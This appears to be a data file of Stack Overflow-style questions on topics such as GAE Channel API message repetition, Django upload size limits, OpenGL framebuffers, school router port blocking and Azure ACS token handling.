5770810,GAE Channel Sending First Message Repetatively,"So this was working on this project a few months ago. I'm using Google App Engine's Channel API to push messages to my GWT app. I'm using http://code.google.com/p/gwt-gae-channel/ to interact through GWT. Lets say I send 1 message to the client: ""First Message"" The client will receive the message, ""First Message"" just fine. Then let's say I send another message, ""Second Message"" to the client. The client will again receive the message, ""First Message"". This will continue happening. There have been some instances where I'll receive the second message, and it will be the message that gets stuck repeating. When I finally close the page, and thus close the channel, I again receive the repeated message without sending something from the server. Does anyone have any idea what is going on? I don't think this was happening when I was working on this a few months ago, and I can see no changes to the GAE Channel API. Here is some code: So whenever I store a new item of a specific type (this is in that entities update function): 1. I turn it into JSON. 2. I then log that JSON. 3. I get that users channel. 4. I send it to that users channel. When I look at my logs, I see that the variable above that I'm logging is showing correctly, meaning I'm logging the correct JSON message but when I display the JSON in an alert on the client-side as soon as it gets to the client, it's the previous message that seems to be stuck repeating.

5826122,Java - Generating strings of length x,"I have some 'heavy' string manipulation in my Java program, which often involves iterating through a String and replacing certain segments with filler characters, usually ""@"".

5832982,Upper bound for family of $n/2$ subsets of $[n]$,"I am not very much into combinatorics, but I want to solve the following problem. Any pointers to existing literature are very much appreciated. Let $n,m$ be integers. I wish to find a set $S = \{S_1, \dots, S_m\}$ as small as possible such that $\forall i: S_i \subset [n]$ and $|S_i| = n/2$, and $\forall A \subset [n]$ with $|A| = n/2: \exists j$ s.t. $|A \cap S_j| \ge (1/4 + \epsilon) n$, for some $0 \le \epsilon \le 1/4$. In other words, I wish to find a family of $n/2$ subsets of $[n]$ of small size such that any other $n/2$-subset of $[n]$ has a large intersection with at least one of the subsets. So far, I figured out that for $\epsilon = 0$, $m \le 2 \log n$ sets are enough: for $i = 1 \dots \log n$, set $S_{2i-1} = \{y :$ the $i$th bit of the binary representation of y is $0$ $\}$ $S_{2i} = \{y :$ the $i$th bit of the binary representation of y is $1$ $\}$ I am not so much interested in lower bounds but rather in constructions of upper bounds.

5833140,Django Image Upload...Prevent huge file uploads,"My site relies on user uploaded image files. I want to limit the max_upload_size. I know that you can set FILE_UPLOAD_MAX_MEMORY_SIZE in settings.py. If a file larger than this size is uploaded, it's written to the disk within the tmp dir. Does that pretty much handle things? Will huge images still affect my site's performance at all? One alternative that I've seen is to configure the max_upload_size in apache, which (it seems) is contained in php.ini. Does that sound right? Is it advisable? Another step involves inspecting the File Object's attributes. I've looked through this snipet (http://djangosnippets.org/snippets/1303/) which presents a form validation method. The potential issues here are that 1) this code applies to a FileField, not an ImageField. I know that ImageField subclasses FileField, so I assume that this is not an issue. Is that true? 2)The entire HttpRequest request is read before validation (so huge files would still be a problem). Also, is the file still written to tmp, even if it raises a validation error? Finally, you'll also notice that this form validation attempts to filter for content types. I assume that's mostly worthless as it's just looking at extensions, which can easily be spoofed. Is that also fair?

I created a framebuffer with glGenFramebuffers, glBindFramebuffer, and glFramebufferTexture2D, and glCheckFramebufferStatus is returning GL_FRAMEBUFFER_COMPLETE. If I then call glClear, followed by a call to glGetTexImage, the returned data shows that the glClear acted on the texture bound to the framebuffer just as it should.

I can't draw anything into the framebuffer, whether I use VBOs or glBegin/glEnd.

We do, however, want to allow the students wireless access to our internal network so that they can download lecture notes, etc. I have two wireless routers (both Netgear routers - a WGR614v9 and a WPN824) set up with different wireless keys: the students have the key for the first router and the teaching staff have the key for the second. Internet access itself comes from a third (non-wireless) Netgear router/modem which is connected to the ADSL line. I've tried various DHCP configurations: having DHCP enabled only on the second router, only on the first, and enabled on both. In general, all computers (student or teacher) end up using the same router as their DHCP server, regardless of which wireless key/router they're using to connect. Right now they're always getting their details assigned by the teachers' router. When I set up port blocking on the students' router (to block HTTP/HTTPS/POP3/SMTP/IMAP/etc. ports) it doesn't seem to make any difference - the student computers still seem to be able to connect to the internet quite happily via the second router (the one that they have as their 'default gateway' because it's the DHCP server).

The value containing the information I need is inside an encrypted value called ""wresult"". I'm having problems decrypting this value to use it for further authentication.

When the module is used, it'll automatically set auth-cookies with the Federated-Authenticationtype. I instead want to retrieve the claims contained in the wresult and then set my own security token (be it JWT, SAML 2.0 or whatever). The only possible workaround I found so far is to use the FAModule, and then delete the session token cookie right away. But this will result in the auth-cookies to be set twice in the response, with the value and right away unsetting it. What I want to achieve in the end is the following: Providing the possibility to either authenticate with a forms site, or authenticate using any identity provider in Azure ACS. Using the forms authentication I can compare the username and password right away and set the security token with whatever claims I want it to have. But when using Azure ACS, I want to compare the retrieve nameidentifier with saved values in my database first, and then set my custom security token, instead of the WS federation one. Or in case the nameidentifier is unknown, I want to redirect to a forms page where the user can authenticate this nameidentifier with his credentials.
